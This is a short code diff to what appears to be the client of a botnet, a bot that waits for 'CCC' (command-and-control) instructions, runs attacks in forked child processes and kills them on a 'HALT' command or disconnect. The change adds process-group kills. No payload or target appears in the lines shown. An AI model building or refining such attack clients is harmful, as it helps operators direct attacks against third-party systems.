@@ -45,9 +45,10 @@ int main()
 		if (bytes == 0) // server disconnected gracefully
 		{
 			close(sock);
+			kill(-pid, SIGKILL);
 			return 0;
 		}
-		
+	
 		if(strncmp("HALT", buffer, 4) == 0)
 		{
 			kill(-pid, SIGKILL);
@@ -56,6 +57,8 @@ int main()
 			cout << "\nAttack halted. Waiting for CCC instructions...\n";
 			continue;
 		} 
+
+ 		if (pid > 0) kill(-pid, SIGKILL);		
 		
 		pid = fork();
 		if (pid == 0) { // child procress
